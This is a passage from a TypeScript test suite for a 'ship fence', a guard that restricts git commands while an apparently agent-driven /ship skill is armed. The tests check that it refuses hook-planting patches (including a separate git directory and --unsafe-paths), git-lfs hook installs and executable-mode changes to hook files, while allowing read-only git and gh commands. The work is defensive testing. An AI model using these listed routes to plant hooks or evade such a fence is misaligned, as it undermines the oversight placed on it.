		}, 30_000);

		test("commands that only look like those still run: reads of the keys, harmless config, asking for the exec path", () => {
			armFence({ pushBranch: BRANCH, root: repo });
			for (const args of [
				["config", "--get", "core.fsmonitor"], ["config", "core.hooksPath"], ["config", "--get-regexp", "^remote\\."], ["config", "--list"], ["config", "user.name", "tester"], ["config", "pull.rebase", "false"],
				["-c", "core.quotepath=false", "status", "--short"], ["-c", "user.name=x", "-c", "user.email=x@y", "commit", "--allow-empty", "-m", "x"], ["-c", "color.ui=never", "log", "-1", "--oneline"], ["--exec-path"],
			]) {
				const r = gitAt(repo, process.env, ...args);
				expect(r.stderr, args.join(" ")).not.toContain("ship fence");
				expect(r.status ?? 0, args.join(" ")).toBeLessThan(2);
			}
			expect(fs.readFileSync(path.join(repo, ".git", "config"), "utf8")).toContain("name = tester");
		});

		const hookPatch = (p: string) => [`diff --git a/${p} b/${p}`, "new file mode 100755", "index 0000000..e69de29", "--- /dev/null", `+++ b/${p}`, "@@ -0,0 +1,2 @@", "+#!/bin/sh", "+echo planted", ""].join("\n");

		test("apply plants no hook: --unsafe-paths and a patch that names a path in a git folder are refused", () => {
			armFence({ pushBranch: BRANCH, root: repo });
			const patch = path.join(privateHome(), "hook.patch");
			write(patch, hookPatch(".git/hooks/pre-commit"));
			for (const args of [["apply", "--unsafe-paths", patch], ["apply", "--uns", patch], ["apply", "-p0", "--unsafe-paths", patch], ["apply", patch], ["apply", "--check", patch]]) refuse(process.env, repo, ...args);
			// A git folder that isn't named .git is not caught by git's own check.
			const proj = path.join(privateHome(), "projects", "sep");
			fs.mkdirSync(proj, { recursive: true });
			sh(proj, "init", "--quiet", "-b", "main", "--separate-git-dir", path.join(proj, "gd"), ".");
			write(path.join(proj, "src/a.ts"), "export const a = 1;\n");
			sh(proj, "add", "src");
			sh(proj, "commit", "--quiet", "-m", "init");
			armFence({ pushBranch: BRANCH, root: proj });
			write(patch, hookPatch("gd/hooks/pre-commit"));
			refuse(process.env, proj, "apply", patch);
			expect(holes).toEqual([]);
			expect(fs.readdirSync(path.join(repo, ".git", "hooks")).filter(name => !name.endsWith(".sample"))).toEqual([]);
			expect(fs.readdirSync(path.join(proj, "gd", "hooks")).filter(name => !name.endsWith(".sample"))).toEqual([]);
			// An ordinary patch applies, however it was made.
			write(path.join(proj, "src/a.ts"), "export const a = 2;\n");
			const diff = sh(proj, "diff");
			sh(proj, "checkout", "--quiet", "--", "src/a.ts");
			write(patch, diff);
			expect(gitAt(proj, process.env, "apply", patch).status).toBe(0);
			expect(fs.readFileSync(path.join(proj, "src/a.ts"), "utf8")).toBe("export const a = 2;\n");
		});

		test("lfs commands that write the hooks never reach git-lfs, as `git lfs` or as `git-lfs`; the others do", () => {
			armFence({ pushBranch: BRANCH, root: repo });
			const stubs = path.join(privateHome(), "stubs");
			stand(path.join(stubs, "git-lfs"));
			process.env.PATH = [SHIM_DIR, stubs, ...(process.env.PATH ?? "").split(path.delimiter).filter(entry => entry !== SHIM_DIR)].join(path.delimiter);
			const lfs = (...args: string[]) => spawnSync("git-lfs", args, { cwd: repo, env: process.env, encoding: "utf8" });
			for (const args of [["lfs", "install", "--force"], ["lfs", "install"], ["lfs", "update", "--force"], ["lfs", "uninstall"]]) refuse(process.env, repo, ...args);
			for (const args of [["install", "--force"], ["install", "--local"], ["update", "--force"], ["uninstall"]]) {
				const r = lfs(...args);
				if (r.status !== 1 || !r.stderr.includes("ship fence")) holes.push(`git-lfs ${args.join(" ")} => ${r.status}: ${r.stderr.trim()}`);
			}
			expect(holes).toEqual([]);
			expect(ran()).toEqual([]);
			expect(git(process.env, "lfs", "ls-files").status).toBe(0);
			expect(lfs("env").status).toBe(0);
			expect(ran()).toEqual(["git-lfs ls-files", "git-lfs env"]);
		});

		test("a push that only changes the mode of a protected file is refused; a mode the base brought, or the branch held, is not", () => {
			const script = path.join(repo, ".githooks", "pre-commit");
			write(script, "#!/bin/sh\nexit 0\n");
			write(path.join(repo, ".husky", "pre-push"), "#!/bin/sh\nexit 0\n");
			sh(repo, "add", "-A");
			sh(repo, "commit", "--quiet", "-m", "tracked hook scripts, not executable");
			armFence({ pushBranch: BRANCH, root: repo });
			expect(Object.keys(currentState().snapshot).sort()).toEqual([".githooks/pre-commit", ".github/workflows/ci.yml", ".husky/pre-push"]);
			fs.chmodSync(script, 0o755);
			sh(repo, "commit", "--quiet", "-am", "make the hook executable");
			expect(sh(repo, "diff", "--summary", "HEAD~1", "HEAD")).toContain("mode change 100644 => 100755 .githooks/pre-commit");
			const push = git(process.env, "push", "origin", BRANCH);
			expect(push.status).toBe(1);
			expect(push.stderr).toContain("would change .githooks/pre-commit");
			expect(originHas(BRANCH)).toBe("");
			// Changing it back leaves nothing to push.
			sh(repo, "reset", "--quiet", "--hard", "HEAD~1");
			expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);

			// What the base brings is fine: origin's default branch holds the hook executable.
			sh(repo, "switch", "--quiet", "main");
			sh(repo, "merge", "--quiet", "--ff-only", BRANCH);
			fs.chmodSync(path.join(repo, ".husky", "pre-push"), 0o755);
			sh(repo, "commit", "--quiet", "-am", "base makes pre-push executable");
			sh(repo, "push", "--quiet", "origin", "main");
			sh(repo, "switch", "--quiet", BRANCH);
			expect(git(process.env, "merge", "--quiet", "--no-edit", "origin/main").status).toBe(0);
			expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
		});

		test("a mode the branch held when /ship armed is not the push's change", () => {
			const script = path.join(repo, ".githooks", "pre-commit");
			write(script, "#!/bin/sh\nexit 0\n");
			sh(repo, "add", "-A");
			sh(repo, "commit", "--quiet", "-m", "hook");
			fs.chmodSync(script, 0o755);
			sh(repo, "commit", "--quiet", "-am", "the user's own chmod");
			armFence({ pushBranch: BRANCH, root: repo });
			write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
			sh(repo, "commit", "--quiet", "-am", "session fix");
			expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
		});

		/** The git commands the skill's Conflicts section names, `<base>` filled in. */
		const conflictSteps = (base: string): string[][] => {
			const skill = fs.readFileSync(path.join(import.meta.dir, "..", "..", "skills", "ship", "SKILL.md"), "utf8");
			const section = /^## Conflicts\n([\s\S]*?)(?=^## )/m.exec(skill)?.[1] ?? "";
			return [...section.matchAll(/`git ([^`]+)`/g)].map(m => (m[1] as string).replace(/<base>/g, base).split(" "));
		};

		test("the skill's conflict steps bring and merge the base in a clone that holds only the watched branch", () => {
			// The branch is pushed, origin's main moves on, and the clone takes the branch alone: no origin/main there.
			write(path.join(repo, "src/b.ts"), "export const b = 1;\n");
			sh(repo, "add", "-A");
			sh(repo, "commit", "--quiet", "-m", "branch work");
			sh(repo, "push", "--quiet", "origin", BRANCH);
			const other = teammate();
			write(path.join(other, "README.md"), "base moved\n");
			sh(other, "add", "-A");
			sh(other, "commit", "--quiet", "-m", "base moves");
			sh(other, "push", "--quiet", "origin", "HEAD:refs/heads/main");
			const dir = path.join(privateHome(), "projects", "single");
			sh(privateHome(), "clone", "--quiet", "--no-local", "--single-branch", "--branch", BRANCH, bare(), dir);
			armFence({ pushBranch: BRANCH, root: dir });
			write(path.join(dir, "src/a.ts"), "export const a = 2;\n");
			sh(dir, "commit", "--quiet", "-am", "mine");
			// A plain fetch leaves the base out, so there is nothing named origin/main to merge.
			expect(gitAt(dir, process.env, "fetch", "--quiet", "origin").status).toBe(0);
			expect(gitAt(dir, process.env, "merge", "--no-edit", "origin/main").status).not.toBe(0);

			expect(conflictSteps("main")).toEqual([["fetch", "origin", "main"], ["merge", "FETCH_HEAD"]]);
			for (const step of conflictSteps("main")) {
				const r = gitAt(dir, process.env, ...step);
				expect(r.stderr, step.join(" ")).not.toContain("ship fence");
				expect(r.status, `${step.join(" ")}: ${r.stderr}`).toBe(0);
			}
			expect(sh(dir, "log", "--format=%s", "-1", "HEAD^2").trim()).toBe("base moves");
			expect(gitAt(dir, process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
			expect(originHas(BRANCH)).toBe(sh(dir, "rev-parse", "HEAD").trim());
		});

		test("stock review and pass commands run while armed: log, show, diff, grep, blame, status, refs, local changes, gh reads", () => {
			const home = privateHome();
			write(path.join(repo, "src/b.ts"), "export const b = 1;\nexport const c = 2;\n");
			write(path.join(repo, "docs/notes.md"), "hooks live in .git/hooks\n");
			sh(repo, "add", "-A");
			sh(repo, "commit", "--quiet", "-m", "feat: b");
			sh(repo, "tag", "v1");
			write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
			sh(repo, "commit", "--quiet", "-am", "fix: a");
			sh(repo, "branch", "side", "HEAD~1");
			write(path.join(repo, "src/c.ts"), "export const z = 1;\n");
			write(path.join(repo, "src/a.ts"), "export const a = 3;\n");
			armFence({ pushBranch: BRANCH, root: repo });
			const reads = [
				"log", "log --oneline", "log --oneline -n 3", "log --graph --oneline --all", "log -p -1", "log --stat", "log --name-only --format=", "log --name-status", "log -S export --oneline", "log -G const --oneline",
				"log --author=t --oneline", "log --since=2000-01-01 --oneline", "log --follow -- src/a.ts", "log main..HEAD --oneline", "log origin/main..HEAD --oneline", "log --merges --oneline", "log --all --decorate --oneline",
				"log --pretty=fuller -1", "log -1 --format=%B", "log --grep=fix --oneline", "log --first-parent --oneline", "log HEAD~1..HEAD", "log --diff-filter=A --name-only --format=", "log --oneline -- src",
				"show", "show HEAD", "show --stat HEAD", "show HEAD:src/a.ts", "show --name-status HEAD", "show HEAD~1:src/b.ts", "show v1", "show --format=%H -s HEAD",
				"diff", "diff --stat", "diff --name-only", "diff --cached", "diff main...HEAD", "diff main..HEAD --stat", "diff HEAD~1", "diff -w", "diff --shortstat", "diff -U0", "diff --color-words", "diff --numstat HEAD~1 HEAD",
				"diff --name-status main HEAD", "diff HEAD -- src/a.ts", "diff --staged", "diff --no-index src/a.ts src/a.ts",
				"grep -n export", "grep -i EXPORT", "grep -e export -e const", "grep --count export", "grep -l export", "grep -n export HEAD~1", "grep -E export.(const|let)", "grep -n .git/hooks docs/notes.md", "grep -w a -- src", "grep --heading -n export",
				"blame src/a.ts", "blame -L1,2 src/b.ts", "blame --porcelain src/a.ts", "blame -w src/a.ts", "blame HEAD~1 -- src/a.ts",
				"status", "status -s", "status --porcelain", "status -b", "status --short --branch", "status --ignored", "status -uall", "status --porcelain=v2 --branch",
				"rev-parse HEAD", "rev-parse --abbrev-ref HEAD", "rev-parse --show-toplevel", "rev-parse --git-dir", "rev-parse --verify HEAD~1", "ls-files", "ls-files --others --exclude-standard", "ls-tree -r HEAD", "ls-tree --name-only HEAD",
				"cat-file -p HEAD", "cat-file -t HEAD", "cat-file -s HEAD:src/a.ts", "for-each-ref", "for-each-ref --format=%(refname) refs/heads", "branch -a", "branch -vv", "branch --show-current", "branch --contains HEAD", "branch --list",
				"tag -l", "tag --points-at HEAD", "describe --always --tags", "shortlog -sn HEAD", "rev-list --count HEAD", "rev-list HEAD~1..HEAD", "merge-base main HEAD", "name-rev HEAD", "show-ref", "show-ref --heads",
				"config --get remote.origin.url", "config --list", "config -l --show-origin", "config user.name", "remote -v", "remote show origin", "remote get-url origin", "stash list", "reflog -5", "worktree list", "count-objects -v",
				"fsck --no-dangling", "ls-remote origin", "ls-remote --heads origin", "fetch origin", "fetch --prune origin", "fetch origin main", "diff-tree --no-commit-id --name-only -r HEAD", "diff-index HEAD", "cherry -v main",
				"format-patch -1 --stdout", "show-branch", "var GIT_AUTHOR_IDENT", "--version", "-C src status -s", "--no-pager log -1", "-c core.quotepath=false log -1 --name-only", "-c color.ui=never diff --stat", "-c user.name=x -c user.email=x@y log -1",
			].map(line => line.split(" "));
			const local = [
				["archive", "--format=tar", "HEAD", "-o", path.join(home, "a.tar")], ["archive", "HEAD", "--prefix=x/", "-o", path.join(home, "b.zip")],
				["add", "src/c.ts"], ["commit", "-m", "chore: add c"], ["commit", "--allow-empty", "-m", "chore: empty"], ["stash", "push", "-m", "wip"], ["stash", "list"], ["stash", "pop"], ["switch", "-c", "tmp"], ["switch", BRANCH], ["branch", "-d", "tmp"],
				["merge", "--no-edit", "side"], ["tag", "v2"], ["push", "--dry-run", "origin", BRANCH], ["push", "origin", BRANCH], ["pull", "--ff-only", "origin", BRANCH],
			];
			const gh = path.join(home, "stubs", "gh");
			write(gh, "#!/bin/sh\necho stub gh $*\n");
			fs.chmodSync(gh, 0o755);
			process.env.PATH = [SHIM_DIR, path.dirname(gh), ...(process.env.PATH ?? "").split(path.delimiter).filter(entry => entry !== SHIM_DIR)].join(path.delimiter);
			const marked = "<!-- omp-ship -->\nFixed the failing test.";
			const ghReads = [
				["pr", "view", "7"], ["pr", "view", "7", "--json", "state,statusCheckRollup"], ["pr", "checks", "7"], ["pr", "diff", "7"], ["pr", "list", "--state", "open"], ["pr", "status"], ["pr", "comment", "7", "--body", marked], ["pr", "edit", "7", "--body", "x"],
				["run", "view", "123", "--log-failed"], ["run", "list", "--limit", "5"], ["run", "rerun", "123", "--failed"], ["api", "repos/o/r/pulls/7/comments"], ["api", "repos/o/r/issues/7/comments", "-f", `body=${marked}`],
				["api", "graphql", "-f", "query=query{viewer{login}}"], ["issue", "view", "3"], ["issue", "list"], ["repo", "view"], ["auth", "status"], ["-R", "o/r", "pr", "view", "7"],
			];
			expect(reads.length + local.length + ghReads.length).toBeGreaterThanOrEqual(85);
			const failed: string[] = [];
			for (const args of [...reads, ...local]) {
				const r = git(process.env, ...args);
				if (r.status !== 0 || r.stderr.includes("ship fence")) failed.push(`git ${args.join(" ")} => ${r.status}: ${r.stderr.trim().split("\n")[0]}`);
			}
			for (const args of ghReads) {
				const r = spawnSync("gh", args, { cwd: repo, env: process.env, encoding: "utf8" });
				if (r.status !== 0 || !r.stdout.startsWith("stub gh")) failed.push(`gh ${args.join(" ")} => ${r.status ?? r.signal ?? r.error?.message}: ${r.stderr.trim().split("\n")[0]}`);
			}
			expect(failed).toEqual([]);
			expect(originHas(BRANCH)).toBe(sh(repo, "rev-parse", "HEAD").trim());
		}, 30_000);
	});
});
